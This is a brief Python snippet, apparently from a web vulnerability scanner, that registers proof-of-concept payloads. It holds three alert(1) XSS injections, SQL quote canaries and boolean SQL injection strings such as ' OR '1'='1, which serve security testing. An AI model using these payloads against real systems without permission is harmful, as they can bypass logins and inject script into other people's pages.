# --- payload registry with family tagging -------------------------------------
from dataclasses import dataclass
from typing import Optional, Dict, List

@dataclass(frozen=True)
class Payload:
    text: str
    family: str                 # 'xss' | 'sqli' | 'redirect' | ...
    meta: Optional[dict] = None # e.g., {'ctx':'attr'} or {'dialect':'sqlite'}

# XSS context-guided pool (example, keep tiny)
CTX_SPECIFIC_XSS: List[Payload] = [
    Payload('<svg onload=alert(1)>', 'xss', {'ctx':'html_body'}),
    Payload('<img src=x onerror=alert(1)>', 'xss', {'ctx':'html_body'}),
    Payload('<script>alert(1)</script>', 'xss', {'ctx':'html_body'}),
]

# SQLi safe canaries + boolean
SQL_ERROR_CANARIES: List[Payload] = [
    Payload("'", 'sqli', {'type':'quote'}),
    Payload('"', 'sqli', {'type':'quote'}),
    Payload("')", 'sqli', {'type':'paren'}),
]
SQL_BOOLEAN_BASE: List[Payload] = [
    Payload("' OR '1'='1", 'sqli', {'dialect':'generic'}),
    Payload('" OR "1"="1', 'sqli', {'dialect':'generic'}),
    Payload(") OR 1=1 -- ", 'sqli', {'dialect':'generic'}),
]

POOLS: Dict[str, Dict[str, List[Payload]]] = {
    'xss': {'ctx_pool': CTX_SPECIFIC_XSS},
    'sqli': {'canary': SQL_ERROR_CANARIES, 'boolean': SQL_BOOLEAN_BASE},
}
# ------------------------------------------------------------------------------
